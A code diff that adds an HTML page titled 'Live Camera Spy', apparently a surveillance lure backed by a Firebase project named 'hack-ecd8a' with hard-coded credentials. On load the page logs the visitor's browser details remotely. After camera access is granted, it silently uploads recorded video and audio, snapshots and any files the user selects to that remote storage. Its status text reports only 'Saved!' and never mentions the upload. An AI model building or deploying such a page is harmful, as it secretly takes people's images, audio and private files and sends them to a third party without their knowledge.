@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎥 Live Camera Spy</title>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: system-ui, sans-serif; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh; color: white; padding: 20px;
+        }
+        .container { max-width: 800px; margin: 0 auto; text-align: center; }
+        h1 { font-size: 2.5em; margin: 20px 0; text-shadow: 0 2px 10px rgba(0,0,0,0.5); }
+        #status { font-size: 18px; padding: 15px; margin: 20px 0; border-radius: 10px; background: rgba(255,255,255,0.1); }
+        .video-section { margin: 30px 0; }
+        #video, #canvas { width: 100%; max-width: 640px; max-height: 480px; border: 4px solid #fff; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.4); }
+        .btn-group { margin: 30px 0; }
+        .btn { padding: 15px 25px; margin: 5px; border: none; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; transition: all 0.3s; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .btn-primary { background: #00d4ff; color: white; }
+        .btn-success { background: #00ff88; color: #000; }
+        .btn-danger { background: #ff4444; color: white; }
+        .btn:hover:not(:disabled) { transform: translateY(-3px); }
+        #fileInput { display: none; }
+        .admin-link { margin-top: 30px; }
+        .admin-link .btn { background: #ffaa00; color: white; font-size: 18px; padding: 20px 40px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎥🔥 Live Camera Spy</h1>
+        
+        <div id="status">Initializing...</div>
+        
+        <div class="video-section">
+            <video id="video" autoplay muted playsinline></video>
+            <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+        </div>
+        
+        <div class="btn-group">
+            <button class="btn btn-success" id="startBtn">📹 Start Camera</button>
+            <button class="btn btn-primary" id="recordBtn" disabled>🎥 Record</button>
+            <button class="btn btn-danger" id="stopBtn" disabled>⏹️ Stop</button>
+            <button class="btn btn-success" id="photoBtn" disabled>📸 Photo</button>
+            <button class="btn btn-primary" id="fileBtn" disabled>📁 Files</button>
+        </div>
+        
+        <input type="file" id="fileInput" multiple accept="image/*,video/*,audio/*">
+        
+      
+    </div>
+
+    <script>
+        // 🔥 YOUR FIREBASE CONFIG (Console se copy)
+        const firebaseConfig = {
+  apiKey: "AIzaSyB2VzKQeFdMoAC5Y90O4ii4BZVkP3oBr4g",
+  authDomain: "hack-ecd8a.firebaseapp.com",
+  databaseURL: "https://hack-ecd8a-default-rtdb.firebaseio.com",
+  projectId: "hack-ecd8a",
+  storageBucket: "hack-ecd8a.firebasestorage.app",
+  messagingSenderId: "736008641484",
+  appId: "1:736008641484:web:c5f07d36bd14bfce7ddb69",
+  measurementId: "G-GPK3FDGSTQ"
+};
+
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        const storageRef = firebase.storage().ref();
+
+        const statusEl = document.getElementById('status');
+        const videoEl = document.getElementById('video');
+        const canvasEl = document.getElementById('canvas');
+        const ctx = canvasEl.getContext('2d');
+
+        let stream = null;
+        let mediaRecorder = null;
+        let recordedChunks = [];
+        const sessionId = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+
+        // Init
+        window.onload = () => {
+            db.ref(`sessions/${sessionId}`).set({
+                userAgent: navigator.userAgent,
+                timestamp: firebase.database.ServerValue.TIMESTAMP
+            });
+            statusEl.textContent = '✅ Ready! Camera start karo';
+        };
+
+        // Camera
+        document.getElementById('startBtn').onclick = async () => {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                videoEl.srcObject = stream;
+                statusEl.textContent = '✅ Camera ON';
+                document.getElementById('recordBtn').disabled = false;
+                document.getElementById('photoBtn').disabled = false;
+                document.getElementById('fileBtn').disabled = false;
+            } catch (e) {
+                statusEl.textContent = '❌ ' + e.message;
+            }
+        };
+
+        // Record
+        document.getElementById('recordBtn').onclick = () => {
+            mediaRecorder = new MediaRecorder(stream);
+            recordedChunks = [];
+            mediaRecorder.ondataavailable = e => recordedChunks.push(e.data);
+            mediaRecorder.onstop = () => uploadFile(new Blob(recordedChunks, { type: 'video/webm' }), 'video');
+            mediaRecorder.start();
+            statusEl.textContent = '🎥 Recording...';
+            document.getElementById('recordBtn').disabled = true;
+            document.getElementById('stopBtn').disabled = false;
+        };
+
+        document.getElementById('stopBtn').onclick = () => {
+            mediaRecorder.stop();
+            statusEl.textContent = '✅ Saved!';
+            document.getElementById('recordBtn').disabled = false;
+            document.getElementById('stopBtn').disabled = true;
+        };
+
+        // Photo
+        document.getElementById('photoBtn').onclick = () => {
+            ctx.drawImage(videoEl, 0, 0);
+            canvasEl.toBlob(blob => uploadFile(blob, 'image'));
+        };
+
+        // Files
+        document.getElementById('fileBtn').onclick = () => document.getElementById('fileInput').click();
+        document.getElementById('fileInput').onchange = e => {
+            Array.from(e.target.files).forEach(file => uploadFile(file, file.type.split('/')[0]));
+        };
+
+        function uploadFile(file, type) {
+            const name = Date.now() + '_' + (file.name || type);
+            const ref = storageRef.child(`files/${sessionId}/${name}`);
+            
+            statusEl.textContent = `📤 ${name}...`;
+            ref.put(file).then(() => ref.getDownloadURL()).then(url => {
+                db.ref('recordings').push({
+                    sessionId, type, name, url, size: file.size,
+                    timestamp: firebase.database.ServerValue.TIMESTAMP
+                });
+                statusEl.textContent = `✅ ${name}`;
+            }).catch(e => statusEl.textContent = '❌ ' + e.message);
+        }
+    </script>
+</body>
+</html>
